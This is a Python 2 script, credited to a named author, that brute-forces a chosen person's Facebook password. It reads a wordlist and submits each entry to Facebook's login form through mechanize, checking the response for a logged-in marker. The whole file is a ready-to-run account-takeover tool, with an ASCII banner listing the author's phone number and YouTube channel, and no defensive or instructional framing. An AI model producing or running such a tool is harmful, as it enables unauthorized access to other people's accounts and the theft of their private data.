#!/usr/bin/python
# -*- coding: utf-8 -*-
#Name:Babar Ali
#github (https://github.com/hearthackerBabar)
#hearthacker

import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()
os.system("clear")
print """
\033[1;31m██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░
\033[1;31m██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░
\033[1;31m███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░
\033[1;31m██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗
\033[1;31m██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝
\033[1;31m╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
\033[1;97m           [⚡\033[1;97mAuthor Name: Babar Ali     ⚡\033[1;97m]
\033[1;97m           [⚡\033[1;97mPhone Numbr: +923000223253 ⚡\033[1;97m]
\033[1;97m           [⚡\033[1;97mYutube Chnl: Pak Anonymous ⚡\033[1;97m]
\033[1;97m           [⚡       \033[1;97mFrom: Pakistan      ⚡\033[1;97m]

\033[1;47m\033[1;35m          Enter Facebook Account User Name                 \033[1;0m
"""    
time.sleep(0.5)
user = raw_input('[+] Target Username/ID/Email : ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[+] Enter Wordlist Directory : ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
print '\033[1;47m\033[1;31m               Cracking Has Been Started                   \033[1;0m   '
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '\033[1;97m[+] \033[1;31mPassword Match : '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "\033[1;97m[+] \033[1;32mWrong Password : "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'Sorry, none of the passswords in your wordlist is right.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
